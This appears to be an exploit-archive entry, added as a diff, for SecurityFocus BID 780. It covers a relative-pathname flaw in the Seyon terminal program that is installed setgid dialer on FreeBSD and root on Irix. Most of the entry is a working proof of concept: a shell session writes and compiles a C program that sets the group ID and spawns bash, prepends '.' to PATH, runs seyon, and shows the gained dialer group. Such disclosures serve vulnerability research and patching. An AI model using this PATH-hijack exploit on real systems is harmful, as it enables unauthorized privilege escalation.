@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/780/info
+
+Seyon uses relative pathnames to spawn two other programs which it requires. It is possible to exploit this vulnerability to obtain the priviliges which seyon runs with. It is installed (by default) setgid dialer on FreeBSD and root on Irix. 
+
+bash-2.03$ uname -a; id; ls -la `which seyon`
+FreeBSD 3.3-RELEASE FreeBSD 3.3-RELEASE #0: Thu Sep 16 23:40:35 GMT 1999=
+=
+
+jkh@highwing.cdrom.com:/usr/src/sys/compile/GENERIC i386
+uid=1000(xnec) gid=1000(xnec) groups=1000(xnec)
+-rwxr-sr-x 1 bin dialer 88480 Sep 11 00:55 /usr/X11R6/bin/seyon
+bash-2.03$ cat > seyonx.c
+void main () {
+setregid(getegid(), getegid());
+system("/usr/local/bin/bash");
+}
+bash-2.03$ gcc -o seyon-emu seyonx.c
+bash-2.03$ PATH=.:$PATH
+bash-2.03$ seyon
+bash-2.03$ id
+uid=1000(xnec) gid=68(dialer) groups=68(dialer), 1000(xnec)
+bash-2.03$
+
+
